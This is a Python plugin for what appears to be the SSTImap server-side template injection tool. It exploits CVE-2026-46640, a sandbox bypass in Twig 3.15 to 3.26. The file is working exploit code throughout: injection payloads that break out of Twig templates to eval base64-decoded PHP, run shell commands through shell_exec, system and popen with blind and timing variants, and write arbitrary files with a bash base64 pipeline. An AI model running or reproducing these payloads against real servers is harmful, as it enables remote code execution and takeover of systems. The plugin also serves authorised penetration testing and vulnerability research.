from plugins.languages import php
from core import bash
from utils import rand


class CVE_2026_46640(php.Php):
    extra_plugin = True
    priority = 6
    header_type = 'add'
    sstimap_version = '1.2.3'
    plugin_info = {
        "Description": """Sandbox bypass in Twig >=3.15.0 <3.26.0""",
        "Usage notes": """Exploits CVE-2026-46640, bypassing sandbox in Twig using _self.("...") code injection
This plugin also works for Twig of versions >=3.15.0 <3.26.0 without sandbox, covered by Twig plugin""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Payload for CVE-2026-46640
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload for older versions of Twig
        ],
        "References": [
            "CVE-2026-46640: https://nvd.nist.gov/vuln/detail/CVE-2026-46640",
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                # Overwrite getTemplateForMacro to prevent errors
                # Use yield from $this->a() to render the rest of the template
                'header': '{{{{{header[0]}+{header[1]}}}}}'
                          '{{{{_self.(";yield from $this->a();}}'
                          'function getTemplateForMacro(string $name,array $context,int $line,Twig\\\\Source $source):'
                          'Twig\\\\Template{{',
                'trailer': 'return $this;}}'
                           'public $macro_=\'\';'
                           'function a(){{//")}}}}'
                           '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f"print('{rand.randints[0]}'+'{rand.randints[1]}');",
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                # Use __destruct to run code after a fatal error
                # Use error_reporting and ini_set to enable error messages
                'header': '{{{{_self.(";}}'
                          'function __destruct(){{'
                          '$h=strval({header[0]}+{header[1]});'
                          'error_reporting(1);'
                          'ini_set(\'display_errors\', 1);',
                # End buffering to trigger callback leading to the error
                'trailer': '$t=strval({trailer[0]}+{trailer[1]});'
                           'call_user_func(join(\'\',[$h,rtrim(strval($b)),$t]));'
                           '}}function a(){{//")}}}}',
                # Anything printing to template or page will work
                'test_render': f"$b='{rand.randints[0]}'+'{rand.randints[1]}';",
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            # PHP code injection, no need for hacks
            'evaluate': {
                'call': 'render',
                'evaluate': """$d='{code_b64}';eval(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
                'test_os': "echo PHP_OS;",
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_error': {
                'call': 'render',
                'evaluate': "$d='{code_b64}';$b=eval('return ('.base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)).');');",
                'test_os': "PHP_OS",
            },
            # Payload based on render payload to avoid errors
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': "{{{{_self.(\";yield from $this->a();}}"
                                  "function getTemplateForMacro(string $name,array $context,int $line,Twig\\\\Source $source):Twig\\\\Template{{"
                                  "$d='{code_b64}';1/(true&&eval('return ('.base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)).');'));"
                                  "return $this;}}public $macro_='';function a(){{//\")}}}}",
            },
            # Payload based simplified error-based payload
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': "{{{{_self.(\";}}function __destruct(){{"
                                  "$d='{code_b64}';eval('('.base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)).')&&sleep({delay});');"
                                  "}}function a(){{//\")}}}}"
            },
            'execute': {
                'call': 'render',
                'execute': """$d='{code_b64}';echo shell_exec(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'call': 'render',
                'execute': """$d='{code_b64}';$b=shell_exec(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)));""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': "{{{{_self.(\";yield from $this->a();}}"
                                 "function getTemplateForMacro(string $name,array $context,int $line,Twig\\\\Source $source):Twig\\\\Template{{"
                                 "$d='{code_b64}';1/(pclose(popen(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)),'wb'))==0);"
                                 "return $this;}}public $macro_='';function a(){{//\")}}}}",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': "{{{{_self.(\";}}function __destruct(){{"
                                  "$d='{code_b64}';system(base64_decode(str_pad(strtr($d,'-_','+/'),strlen($d)%4,'=',STR_PAD_RIGHT)).'&&sleep {delay}');"
                                  "}}function a(){{//\")}}}}"
            },
            # Using execute as rendered and error-based payloads can use different workdirs
            'write': {
                'call': 'execute',
                'write': "bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'",
                'truncate': "echo -n >{path}"
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            # Current payloads require escaping all constructs
            {'level': 2, 'prefix': '{{% endfor %}}', 'suffix': '{% for a in [1] %}'},
            {'level': 2, 'prefix': '{{% endif %}}', 'suffix': '{% if 0 %}'},
            {'level': 3, 'prefix': '{closure} }}}}{{% endfor %}}', 'suffix': '{% for a in [1] %}',
             'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure} }}}}{{% endif %}}', 'suffix': '{% if 0 %}',
             'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure} %}}{{% endfor %}}', 'suffix': '{% for a in [1] %}',
             'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure} %}}{{% endif %}}', 'suffix': '{% if 1 %}',
             'closures': php.ctx_closures},
            # Escaping comment
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},
            # This escapes string "inter#{"asd"}polation"
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
